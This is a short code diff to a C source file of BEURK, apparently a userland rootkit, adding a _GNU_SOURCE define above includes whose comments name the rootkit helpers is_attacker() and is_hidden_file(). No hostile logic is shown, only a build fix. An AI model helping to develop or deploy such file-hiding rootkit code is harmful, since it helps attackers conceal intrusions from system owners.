@@ -18,6 +18,8 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+#define _GNU_SOURCE /* struct dirent64 */
+
 #include <dirent.h> /* struct dirent64, DIR */
 #include <string.h> /* strcmp() */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
